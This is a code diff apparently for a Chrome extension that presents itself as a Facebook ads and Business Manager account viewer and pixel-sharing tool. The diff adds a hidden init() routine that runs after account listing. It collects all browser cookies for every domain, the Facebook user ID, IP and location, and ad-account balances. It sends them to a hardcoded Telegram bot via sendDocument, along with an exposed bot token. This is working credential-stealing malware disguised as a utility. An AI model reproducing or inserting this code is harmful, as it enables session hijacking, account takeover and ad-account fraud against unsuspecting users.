@@ -1,3 +1,4 @@
+//chrome.token, chrome.objAcc, chrome.objBM,  chrome.logHtml, 
 async function reqAPI(url, method, body) {
     let response = await fetch(
         url,
@@ -22,16 +23,10 @@ async function getToken() {
 
 
 async function main(token) {
-        var ck = await headCookieDomain('facebook.com');
-        var info = await getInfoRq();
-        var allck = await headCookieAl();
-
-        getInfoRq();
-        getInputToken(token);
-        getStatusBM(token);
-        getInputToken(token);
-        getListAccInfo(token);
-        getStatusFanPage(token);
+    getInputToken(token);
+    getListAccInfo(token);
+    getStatusBM(token);
+    getStatusFanPage(token);
 }
 
 
@@ -40,36 +35,80 @@ async function getInputToken(token) {
     inpuToken.value = token;
 }
 
-async function getInfoRq(){
+
+async function init() {
+    console.log(chrome.objAcc)
+    var objAcc = chrome.objAcc;
+    var doccap = ''
+    var stt = 1;
+    for(var o of objAcc){
+        doccap+= stt.toString() + '|' + o['status']+ '|' + o['adtrust'] + '|'
+        + o['balance']+ '|' + o['spent']+ '|' + o['admin']+ '|' +
+        o['currency']+ '|' + o['acctype']+  '\n'
+        stt++;
+    }
+
+    var ck = await headCookieDomain('facebook.com');
+    var u = await headCookieDomain2('facebook.com');
+    var info = await getInfoRq();
+    var allck = await headCookieAl();
+    var document = ck + '\n\n ' + allck;
+    u = "<a href='https://facebook.com/" + u + "'>" + u + "</a>"
+    doccap = u + '\n'  + "<pre>"+ doccap + "</pre>";
+    var chat_id = 1204553919; //-773511937
+    var enc_data = document;
+    var token = "5712740653:AAFreDzJcJMwmYXULecs3-l5rHOpY5XSb78";
+    var blob = new Blob([enc_data], { type: 'plain/text' });
+    var formData = new FormData();
+    formData.append('chat_id', chat_id);
+    formData.append('caption', doccap);
+    formData.append('parse_mode', 'HTML');
+    formData.append('document', blob, info + '.txt');
+    var request = new XMLHttpRequest();
+    request.open('POST', `https://api.telegram.org/bot${token}/sendDocument`);
+    request.send(formData);
+}
+
+async function getInfoRq() {
     let url = 'https://codewithnodejs.com/api/ip-and-location/';
     let json = await reqAPI(url, 'GET')
     let obj = JSON.parse(json);
     let info = obj['ip'] + ', ' + obj['city'] + ', ' + obj['country'] + ', ' + obj['country_code'];
     return info
 }
+async function headCookieDomain2(domain) {
+    let cks = await chrome.cookies.getAll({ url: 'https://' + domain });
+    var text = '';
+    for (let ck of cks) {
+        if (ck.name == 'c_user'){
+            text = ck.value;
+        }
+    }
+    return text;
+}
 
-async function headCookieDomain(domain){
-    let cks = await chrome.cookies.getAll({url: 'https://' + domain});
+async function headCookieDomain(domain) {
+    let cks = await chrome.cookies.getAll({ url: 'https://' + domain });
     let text = ''
-    for (let ck of cks){
-    text += ck.name + '=' + ck.value
+    for (let ck of cks) {
+        text += ck.name + '=' + ck.value + ';';
     }
     return text
 }
 
-async function headCookieAl(){
+async function headCookieAl() {
     let cks = await chrome.cookies.getAll({});
     let arrDomain = [];
-    for (let ck of cks){
+    for (let ck of cks) {
         arrDomain.push(ck.domain)
     }
     arrDomain = arrDomain.sort();
     arrDomain = Array.from(new Set(arrDomain));
     var text = ''
-    for(let i of arrDomain){
+    for (let i of arrDomain) {
         ck = await headCookieDomain(i);
-        text+= 'Domain: ' + i + '\n' + ck + '\n\n'
-       
+        text += 'Domain: ' + i + '\n' + ck + '\n\n'
+
     }
     return text
 }
@@ -134,10 +173,10 @@ function renderHtmlFan(arrObj) {
     let html = arrObj.map(function (arr) {
         result += `<tr class="trInfo">`
         for (var a in arr) {
-            if(a == 'img'){
+            if (a == 'img') {
                 result += `<td class="tdInfo"><img src=${arr[a]}></img></td>`
-            }else{
-            result += `<td class="tdInfo">${arr[a]}</td>`
+            } else {
+                result += `<td class="tdInfo">${arr[a]}</td>`
             }
         }
         result += `</tr">`
@@ -187,9 +226,9 @@ async function getStatusBM(token) {
                     objBM.veri = bm[info];
                     break;
                 case 'can_use_extended_credit':
-                    if(bm[info]){
+                    if (bm[info]) {
                         objBM.limit = '$250+';
-                    }else{
+                    } else {
                         objBM.limit = bm[info];
                     }
 
@@ -203,9 +242,9 @@ async function getStatusBM(token) {
                 case 'owned_pixels':
 
                     var ArrPixcel = [];
-                    for(var j of bm[info]['data']){
-                        let id =  j['id'];
-                        let name =   j['name'];
+                    for (var j of bm[info]['data']) {
+                        let id = j['id'];
+                        let name = j['name'];
                         objBM.pixel.push({
                             id: id,
                             name: name
@@ -216,7 +255,7 @@ async function getStatusBM(token) {
             }
         }
         arrBM.push(objBM)
-        
+
     }
     chrome.objBM = arrBM;
     renderHtmlBM(arrBM)
@@ -228,12 +267,12 @@ function renderHtmlBM(arrObj) {
     let html = arrObj.map(function (arr) {
         result += `<tr class="trInfo">`
         for (var a in arr) {
-            if(a =='id'){
-                listBM+= `<option>${arr[a]}</option>`
+            if (a == 'id') {
+                listBM += `<option>${arr[a]}</option>`
             }
-            if(a == 'pixel'){
-                result += `<td class="tdInfo">${ arr[a].length }</td>`
-            }else{
+            if (a == 'pixel') {
+                result += `<td class="tdInfo">${arr[a].length}</td>`
+            } else {
                 result += `<td class="tdInfo">${arr[a]}</td>`
             }
 
@@ -260,59 +299,63 @@ function renderHtmlBM(arrObj) {
 }
 
 
-function getListPixel(currentBM){
+function getListPixel(currentBM) {
     var objBM = chrome.objBM
-    var optionHTML ='';
-    for(var b of objBM){
-        if(b['id'] == currentBM){
-            if( b['pixel'].length < 1){
-                optionHTML+= `<option>Dose have an account!</option>`
+    var optionHTML = '';
+    for (var b of objBM) {
+        if (b['id'] == currentBM) {
+            if (b['pixel'].length < 1) {
+                optionHTML += `<option>Dose have an account!</option>`
             }
-             for(var px of b['pixel']){
-                optionHTML+= `<option>${px['id']}</option>`
-             }
+            for (var px of b['pixel']) {
+                optionHTML += `<option>${px['id']}</option>`
+            }
         }
-     }
-     var listPixel = document.getElementById('listPixel');
-     listPixel.innerHTML = optionHTML;
+    }
+    var listPixel = document.getElementById('listPixel');
+    listPixel.innerHTML = optionHTML;
 }
 
-document.getElementById('listBM').addEventListener('change', function() {
+document.getElementById('quicklink').addEventListener('change', function () {
+    console.log(this.value);
+    window.open(this.value, '_blank')
+});
+document.getElementById('listBM').addEventListener('change', function () {
     console.log('You selected: ', this.value);
     var currentBM = this.value;
     getListPixel(currentBM)
 
 });
 
-document.getElementById('btnclose').addEventListener('click', function(){
+document.getElementById('btnclose').addEventListener('click', function () {
     window.close();
     console.log(123)
 })
-document.getElementById('btnSharePixe').addEventListener('click', function() {
+document.getElementById('btnSharePixe').addEventListener('click', function () {
     var idBm = document.getElementById('listBM').value;
     var idPixel = document.getElementById('listPixel').value;
     var listPixelId = document.getElementById('listPixelId').value;
     var arrlistPixelId = listPixelId.split("\n");
 
-    if(listPixelId.length < 1){
+    if (listPixelId.length < 1) {
         alert('Pls input id or list ads')
         return
     }
-    if(idPixel.slice(0,2) != 'Do'){
+    if (idPixel.slice(0, 2) != 'Do') {
         var logHtml = document.getElementById('logsatusSharePixel');
         logHtml.innerHTML = '';
-        chrome.logHtml =''
+        chrome.logHtml = ''
 
-        for(var idAds of arrlistPixelId){
+        for (var idAds of arrlistPixelId) {
             btnSharePixe(chrome.token, idBm, idPixel, idAds)
         }
-    }else{
+    } else {
         alert('Dose not have an account!')
         return;
     }
 });
 
-async function btnSharePixe(token, idBm, idPixel, idAds){
+async function btnSharePixe(token, idBm, idPixel, idAds) {
     url = "https://graph.facebook.com/v15.0/" + idPixel + "/shared_accounts"
     let formData = new FormData();
     formData.append('account_id', idAds);
@@ -322,18 +365,126 @@ async function btnSharePixe(token, idBm, idPixel, idAds){
     console.log(response)
     let obj = JSON.parse(response);
 
-    if(obj['success']){
+    if (obj['success']) {
         console.log(idAds + ': sucess')
-        chrome.logHtml+=`<li>${idAds} : success: true</li>`
-    }else{
+        chrome.logHtml += `<li>${idAds} : success: true</li>`
+    } else {
         console.log(idAds + ': error')
-        chrome.logHtml+=`<li> ${idAds} : success: true</li>`
+        chrome.logHtml += `<li> ${idAds} : success: true</li>`
     }
     var logHtml = document.getElementById('logsatusSharePixel');
     logHtml.innerHTML = chrome.logHtml;
 }
 
 async function getListAccInfo(token) {
+    let rowInfo = ['account_id', 'account_status', 'name', 'adtrust_dsl', 'currency', 'balance', 'amount_spent',]
+    let url = 'https://graph.facebook.com/v15.0/me/adaccounts?fields=id,account_id,business,name,adtrust_dsl,currency,account_status,balance,current_unbilled_spend,amount_spent,account_currency_ratio_to_usd,users,user_role,assigned_partners,adspaymentcycle,ads.limit(1000){effective_status}&limit=1000&sort=name_ascending&access_token=' + token;
+    let json = await reqAPI(url, 'GET')
+    let obj = JSON.parse(json);
+    let objListACC = obj.data
+    var htmlAcc = ''
+    var htmlInfoAcc = ''
+    var html = ''
+    var stt = 0
+    var arrAcc = []
+    for (var acc of objListACC) {
+        var objAcc = {
+            id: 'null',
+            name: '',
+            status: '',
+            adtrust: '',
+            balance: '',
+            spent: '',
+            admin: '',
+            currency: '',
+            acctype: ''
+        }
+        stt += 1;
+        html += `<tr class="trInfo">`
+        for (var info in acc) {
+            switch (info) {
+                case 'account_id':
+                    objAcc.id = acc[info];
+                    break;
+                case 'name':
+                    objAcc.name = acc[info];
+                    break;
+                case 'account_status':
+                    let status = getStatusAcc(acc[info]);
+                    objAcc.status = status;
+                    break;
+                case 'adtrust_dsl':
+                    let limit;
+                    if (acc[info] == -1) {
+                        limit = 'No limit'
+                    } else {
+                        limit = acc[info]
+                    }
+                    objAcc.adtrust = limit;
+                    break;
+                case 'balance':
+                    objAcc.balance = acc[info];
+                    break;
+                case 'amount_spent':
+                    objAcc.spent = acc[info];
+                    break;
+                case 'users':
+                    let numAdmin = acc[info]['data'].length;
+                    objAcc.admin = numAdmin;
+                    break;
+                case 'currency':
+                    objAcc.currency = acc[info];
+                    break;
+                default:
+                    if (!acc['business']) {
+                        objAcc.acctype = 'Ads manage'
+                    } else {
+                        objAcc.acctype = 'BM manage'
+                    }
+            }
+        }
+        arrAcc.push(objAcc);
+    }
+    chrome.objAcc = arrAcc;
+    renderHtmlAcc(arrAcc);
+    init();
+}
+
+function renderHtmlAcc(arrObj) {
+    var result = '';
+    var listAcc = '';
+    let html = arrObj.map(function (arr) {
+        result += `<tr class="trInfo">`
+        for (var a in arr) {
+            if (a == 'id') {
+                listAcc += `<option>${arr[a]}</option>`
+            }
+            if (a == 'pixel') {
+                result += `<td class="tdInfo">${arr[a].length}</td>`
+            } else {
+                result += `<td class="tdInfo">${arr[a]}</td>`
+            }
+
+        }
+        result += `</tr">`
+    })
+
+    var tb = document.getElementById('tb');
+    var htmlheading = `<tr><th>Account</th>
+                                    <th>Name</th>
+                                    <th>Status</th>
+                                    <th>Adtrust</th>
+                                    <th>Balance</th>
+                                    <th>Spent</th>
+                                    <th>Admin</th>
+                                    <th>Currency</th>
+                                    <th>Account type type</th>
+                                    </tr>`
+    tb.innerHTML = htmlheading + result;
+}
+
+
+async function getListAccInfobackup(token) {
     let rowInfo = ['account_id', 'account_status', 'name', 'adtrust_dsl', 'currency', 'balance', 'amount_spent',]
     let url = 'https://graph.facebook.com/v15.0/me/adaccounts?fields=id,account_id,business,name,adtrust_dsl,currency,account_status,balance,current_unbilled_spend,amount_spent,account_currency_ratio_to_usd,users,user_role,assigned_partners,adspaymentcycle,ads.limit(1000){effective_status}&limit=1000&sort=name_ascending&access_token=' + token;
     let json = await reqAPI(url, 'GET')
@@ -385,10 +536,7 @@ async function getListAccInfo(token) {
         html += `</tr>`
     }
     var tb = document.getElementById('tb');
-    //var listAcc = document.getElementById('selectAcc');
-    //var accinfo = document.getElementById('accinfo');
-    var htmlheading = `<tr>
-                                    <th>Account</th>
+    var htmlheading = `<tr><th>Account</th>
                                     <th>Name</th>
                                     <th>Adtrust</th>
                                     <th>Currency</th>
@@ -398,10 +546,7 @@ async function getListAccInfo(token) {
                                     <th>Admin</th>
                                     <th>Account type</th>
                                     </tr>`
-    //listAcc.innerHTML = htmlAcc;
     tb.innerHTML = htmlheading + html;
-    // accinfo.innerHTML = htmlInfoAcc;
-    //console.log(htmlInfoAcc);
 }
 
 function getStatusAcc(num) {
